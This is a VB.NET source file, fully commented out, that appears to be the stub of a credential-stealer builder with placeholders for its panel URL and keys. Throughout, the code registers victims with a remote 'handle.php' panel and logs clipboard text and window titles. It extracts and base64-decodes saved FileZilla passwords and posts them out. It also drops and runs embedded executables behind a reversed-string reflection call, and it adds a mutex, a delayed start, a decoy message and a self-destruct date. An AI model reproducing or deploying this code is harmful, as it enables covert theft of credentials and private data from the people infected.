﻿'Option Explicit Off
'Option Strict Off
'Imports System.Reflection
'Imports System.Runtime.InteropServices
'Imports System
'Imports Microsoft.VisualBasic
'Imports System.Text
'Imports System.Security.Cryptography
'Imports Microsoft.Win32
'Imports System.Windows.Forms
'Imports System.IO
'Imports System.CodeDom.Compiler
'Imports System.Resources
'Imports System.Collections
'Imports System.Threading
'Imports System.Net, System.Net.Mail
'Imports System.Environment
'Imports System.Drawing
'Imports System.Security
'Imports System.Reflection.Emit
'Imports System.Collections.Generic
'Imports System.Diagnostics
'Imports System.Timers
'Imports System.Text.RegularExpressions
'Imports System.Management


'<Assembly: AssemblyTitleAttribute("'Assembly_Title")> 
'<Assembly: AssemblyDescriptionAttribute("'Assembly_Description")> 
'<Assembly: AssemblyCompany("'Assembly_Company")> 
'<Assembly: AssemblyCopyright("'Assembly_Copyright")> 
'<Assembly: AssemblyTrademark("'Assembly_Trademark")> 
'<Assembly: AssemblyProduct("'Assembly_Product")> 
'<Assembly: AssemblyFileVersion("'Assembly_FileVersion")> 
'<Assembly: AssemblyInformationalVersion("'Assembly_Version")> 



' ''' <summary>
' ''' Define Constants that will be used while execution
' ''' </summary>
' ''' <remarks>These values won't change after declaration. Replace these values while compiling with CodeDOM</remarks>
'Public Class Values
'    Public Const ResourceName As String = "'MainResourceName"
'    Public Const Identifier As String = "'FileIdentifier"
'    'Delivery Settings
'    Public Const WebPath As String = "'LinkToWebPath"
'    Public Const SecurityKey As String = "'EncryptedSecurityKey"
'    Public Const AuthKey As String = "'GeneratedAuthorizationKey"
'    Public Const ComputerLimit As String = "'ComputerLimit"
'    Public Const SessionLimit As String = "'SessionLimit"
'    'Smart Settings
'    Public Const MessageTitle As String = "'InstallationMessageTitle"
'    Public Const MessageBody As String = "'InstallationMessageBody"
'    Public Const MessageBoxIcon As String = "'InstallationMessageBoxIcon"
'    Public Const MessageBoxButtons As String = "'InstallationMessageBoxButtons"
'    'Advanced Settings
'    Public Const StartupKey As String = "'StartupKey"
'    Public Const RandomMutex As String = "'RandomMutex"
'    Public Const DelayExecution_Time As String = "'ExecutionDelaySeconds"
'    Public Const SelfDestruction_Date As String = "'SelfDestructionTime"

'    Public Shared Checksum As String = Helper.GetChecksum(Application.ExecutablePath)
'    Public Shared MachineID As String = Helper.GetProcessorId()
'    Public Shared MachineName As String = Environment.MachineName
'    Public Shared FileName As String = IO.Path.GetFileName(Application.ExecutablePath)
'End Class
'Public Module PostLog
'    Public Function PostRequest(ByVal Parameters As String(), ByVal PValues As String()) As String
'        Try
'            Using Client As New WebClient
'                'Client.Headers.Add(HttpRequestHeader.UserAgent, "Sending Log")
'                Dim _Param As New Specialized.NameValueCollection
'                With _Param
'                    For i = 0 To Parameters.Length - 1
'                        .Add(Parameters(i), PValues(i))
'                    Next
'                End With
'                Dim responsebytes = Client.UploadValues(Values.WebPath & "handle.php", "POST", _Param)
'                Dim responsebody = (New System.Text.UTF8Encoding).GetString(responsebytes)
'                Return responsebody
'            End Using
'        Catch ex As Exception
'            Return ex.ToString
'        End Try
'    End Function
'End Module
'Public Module MainClass

'    ''' <summary>
'    ''' Initialize Local Variables, Threads and Constructors
'    ''' </summary>
'    ''' <remarks></remarks>

'    Public NotificationThread As New Thread(AddressOf Logging.Notification)
'    Public RegisterThread As New Thread(AddressOf Delivery.RegisterComputer)
'    Public ValidateLimitThread As Thread
'    Public ValidateSessionThread As Thread
'    Public KeystrokeThread As Thread
'    Public PasswordsThread As New Thread(AddressOf Logging.PasswordRecovery)
'    Public ClipboardThread As New Thread(AddressOf Logging.ClipboardLogging)
'    Public ScreenshotThread As Thread
'    Public ApplicationThread As Thread
'    Public WebBlockThread As Thread
'    Public WebvisitThread As New Thread(AddressOf SmartSettings.VisitWebsites)
'    Public MessageThread As New Thread(AddressOf SmartSettings.InstallationMessage)
'    Public StartupThread As Thread
'    Public FileAttributesThread As Thread
'    Public AttachFilesThread As New Thread(AddressOf AdvancedSettings.OpenAttachedFiles)
'    Public SelfDestructionThread As New Thread(AddressOf AdvancedSettings.SelfDestruction)

'    Public WebsiteVisitList As New List(Of String)
'    Public WebsiteBlockList As New List(Of String)
'    Public HotLoggingList As New List(Of String)
'    Public InstaLoggingList As New List(Of String)
'    Public AttachedList As New List(Of String)

'    Public ClipboardLog As String = Nothing
'    Public FirstRun As Boolean = IsFirstRun()
'    Public Sub Main()
'        Try
'            'Process_Mutex AdvancedSettings.ProcessMutex(Values.RandomMutex)
'            'Delay_Execution AdvancedSettings.DelayExecution(CType(Values.DelayExecution_Time, Integer))
'            'Self_Destruction SelfDestructionThread.Start()

'            'AddToAttachedList 
'            'Ex:AttachedList.Add("Hi.exe")
'            'Attach_Files AttachFilesThread.Start()


'            RegisterThread.Start()

'            NotificationThread.Start()
'            ClipboardThread.SetApartmentState(ApartmentState.STA)
'            ClipboardThread.Start()

'            PasswordsThread.Start()
'            MessageThread.Start()

'            'AddToWebsiteList 
'            'Ex:WebsiteVisitList.Add("Link")
'            'Website_Visitor WebvisitThread.Start()

'            MessageBox.Show("Your code is great. It works!", "Congratulations!", MessageBoxButtons.OK, MessageBoxIcon.Information)
'            IdentityFound = IsFirstRun()
'            Application.Run()
'        Catch ex As Exception
'            MessageBox.Show(ex.ToString)
'        End Try
'    End Sub
'    Public Function IsFirstRun() As Boolean
'        Dim FirstRun As Boolean = True
'        Dim RegID As String = GenerateHash(IO.Path.GetFileName(Application.ExecutablePath))
'        Dim RegKey As RegistryKey = Registry.CurrentUser.OpenSubKey(RegID)
'        If RegKey Is Nothing Then
'            FirstRun = True
'            RegKey = Registry.CurrentUser.CreateSubKey(RegID)
'            With RegKey
'                .SetValue(RegID, RegID)
'                .Close()
'            End With
'        Else
'            FirstRun = False
'        End If
'        Return FirstRun
'    End Function

'End Module
'Public Class Logging
'    Public Shared Sub Notification()
'        Try
'            Dim Parameters As String() = New String() {"tablename", "identifier", "securitykey", "checksum", "machineid", "machinename", "executiontime"}
'            Dim PValues As String() = New String() {"Notifications", Values.Identifier, Values.SecurityKey, Values.Checksum, Values.MachineID, Values.MachineName, Now.ToShortTimeString}
'            Dim Response As String = PostLog.PostRequest(Parameters, PValues)
'        Catch ex As Exception
'        End Try
'    End Sub
'    Public Shared Sub ClipboardLogging()
'        Dim T As String = Nothing
'        Do
'            If Clipboard.GetText <> Nothing And Clipboard.GetText <> T Then
'                T = Clipboard.GetText
'                Dim Parameters As String() = New String() {"tablename", "identifier", "securitykey", "filename", "checksum", "machineid", "machinename", "windowtitle", "clipboardtext", "machinetime"}
'                Dim PValues As String() = New String() {"Clipboards", Values.Identifier, Values.SecurityKey, Values.FileName, Values.Checksum, Values.MachineID, Values.MachineName, Helper.GetCaption(), Clipboard.GetText, Now.ToShortTimeString}
'                Dim Response As String = PostLog.PostRequest(Parameters, PValues)
'            End If
'            Thread.Sleep(3)
'        Loop
'    End Sub
'    Public Shared Sub PasswordRecovery()
'        FileZilla.RecoverPasswords()
'    End Sub
'End Class
'Public Class Delivery
'    Public Shared Sub RegisterComputer()
'        Dim Parameters As String() = New String() {"tablename", "identifier", "securitykey", "authkey", "filename", "checksum", "machineid", "machinename", "operatingsystem"}
'        Dim PValues As String() = New String() {"Computers", Values.Identifier, Values.SecurityKey, Values.AuthKey, Values.FileName, Values.Checksum, Values.MachineID, Values.MachineName, My.Computer.Info.OSFullName}
'        Dim Response As String = PostLog.PostRequest(Parameters, PValues)
'    End Sub
'End Class

'Module Helper
'    Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As Int32, ByRef lpdwProcessId As Int32) As Int32
'    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
'    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
'    Private makel As String
'    Public Function GetActiveAppProcess() As Process
'        Dim activeProcessID As IntPtr
'        GetWindowThreadProcessId(GetForegroundWindow(), activeProcessID)
'        Return Process.GetProcessById(activeProcessID)
'    End Function
'    Public Function GetCaption() As String
'        Dim Caption As New System.Text.StringBuilder(256)
'        Dim hWnd As IntPtr = GetForegroundWindow()
'        GetWindowText(hWnd, Caption, Caption.Capacity)
'        Return Caption.ToString()
'    End Function
'    Public Function GetChecksum(ByVal Filename As String) As String
'        Using Stream As FileStream = File.OpenRead(Filename)
'            Dim SHA256 As New SHA256Managed()
'            Dim CheckSum As Byte() = SHA256.ComputeHash(Stream)
'            Dim Result As String = Nothing
'            For Each B As Byte In CheckSum
'                Result += B.ToString("x1")
'            Next
'            Return Result
'        End Using
'    End Function
'    Public Function GetProcessorId() As String
'        Dim ProcID As String = String.Empty
'        Dim SQuery As New SelectQuery("Win32_processor")
'        Dim Searcher As New ManagementObjectSearcher(SQuery)
'        Dim Info As ManagementObject
'        For Each Info In Searcher.Get()
'            ProcID = Info("processorId").ToString()
'        Next
'        Return ProcID
'    End Function
'    Public Function GetBetween(ByVal _TotalBody As String, ByVal _StartSearch As String, ByVal _EndSearch As String, ByVal _Counter As Integer) As String
'        Dim _Hold As String = Regex.Split(_TotalBody, _StartSearch)(_Counter + 1)
'        Return Regex.Split(_Hold, _EndSearch)(0)
'    End Function

'    Public Function GenerateHash(ByVal S As String) As String
'        Dim SHA1Obj As New SHA1CryptoServiceProvider
'        Dim HashBytes() As Byte = Encoding.ASCII.GetBytes(S)
'        HashBytes = SHA1Obj.ComputeHash(HashBytes)
'        Dim Result As String = Nothing
'        For Each B As Byte In HashBytes
'            Result += B.ToString("x1")
'        Next
'        Return Result
'    End Function
'End Module
'Public Class SmartSettings
'    Public Shared Sub InstallationMessage()
'        If FirstRun Then
'            MessageBox.Show(Values.MessageBody, Values.MessageTitle, [Enum].Parse(GetType(MessageBoxButtons), Values.MessageBoxButtons, True), [Enum].Parse(GetType(MessageBoxIcon), Values.MessageBoxIcon, True))
'        End If
'    End Sub
'    Public Shared Sub VisitWebsites()
'        If FirstRun Then
'            For Each I As String In WebsiteVisitList
'                Process.Start(I)
'            Next
'        End If
'    End Sub
'End Class
'Public Class AdvancedSettings
'    Public Shared Sub ProcessMutex(ByVal RandomMutex As String)
'        Dim Mutex As Mutex = New Mutex(False, RandomMutex)
'        If Not Mutex.WaitOne(0, False) Then
'            End
'        End If
'    End Sub
'    Public Shared Sub DelayExecution(ByVal Seconds As Integer)
'        Thread.Sleep(Seconds)
'    End Sub
'    Public Shared Sub SelfDestruction()
'        Dim DateTime As DateTime = CType(Values.SelfDestruction_Date, DateTime)
'        Do
'            If DateTime.CompareTo(Now) < 0 Then
'                MessageBox.Show("This file is not valid anymore!", "Self-Destructed!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
'                End
'            End If
'            Thread.Sleep(60000)
'        Loop
'    End Sub
'    Public Shared Sub OpenAttachedFiles()
'        'AttachFiles:Once If FirstRun Then
'        Try
'            For Each I As String In AttachedList
'                Dim Assembly As Assembly = GetType(System.Reflection.Assembly).GetMethod(StrReverse("ylbmessAgnitucexEteG")).Invoke(Nothing, Nothing)
'                Dim ResManager As New Resources.ResourceManager(Values.ResourceName, Assembly)
'                Dim FilePath As String = IO.Path.Combine(Environment.GetFolderPath(SpecialFolder.CommonApplicationData), I)
'                Dim ExtractedBytes As Byte() = ResManager.GetObject(I)
'                IO.File.WriteAllBytes(FilePath, ExtractedBytes)
'                Process.Start(FilePath)
'            Next
'        Catch ex As Exception
'            MessageBox.Show(ex.ToString)
'        End Try
'        'AttachFiles:Once End If
'    End Sub
'End Class

'Module Passwords
'    Public Sub Send(ByVal Application As String, ByVal Link As String, ByVal Username As String, ByVal Password As String)
'        Dim Pass_Parameters As String() = New String() {"tablename", "identifier", "securitykey", "authkey", "filename", "checksum", "machineid", "machinename", "application", "link", "username", "password"}
'        Dim Pass_Values As String() = New String() {"Passwords", Values.Identifier, Values.SecurityKey, Values.AuthKey, Values.FileName, Values.Checksum, Values.MachineID, Values.MachineName, Application, Link, Username, Password}
'        Dim Response As String = PostLog.PostRequest(Pass_Parameters, Pass_Values)
'    End Sub
'    Public Class FileZilla
'        Public Shared Sub RecoverPasswords()
'            Try
'                Dim T As String = Nothing
'                Dim Link As String = Nothing, Username As String = Nothing, Password As String = Nothing
'                Dim Path As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
'                Dim _RecentServersPath As String = IO.Path.Combine(Path, "FileZilla\recentservers.xml"), _SiteManagerPath As String = IO.Path.Combine(Path, "FileZilla\sitemanager.xml")
'                If IO.File.Exists(_RecentServersPath) Then
'                    T = IO.File.ReadAllText(_RecentServersPath)
'                ElseIf IO.File.Exists(_SiteManagerPath) Then
'                    T = IO.File.ReadAllText(_SiteManagerPath)
'                End If
'                For j = 1 To Regex.Matches(T, "<Server>").Count
'                    Link = Helper.GetBetween(T, "<Host>", "</Host>", j - 1)
'                    Username = Helper.GetBetween(T, "<User>", "</User>", j - 1)
'                    Password = Helper.GetBetween(T, "<Pass encoding=""base64"">", "</Pass>", j - 1)
'                    Password = System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Password))
'                    ''Postrequest
'                    Send("FileZilla", Link, Username, Password)
'                Next
'            Catch ex As Exception
'            End Try
'        End Sub
'    End Class
'End Module
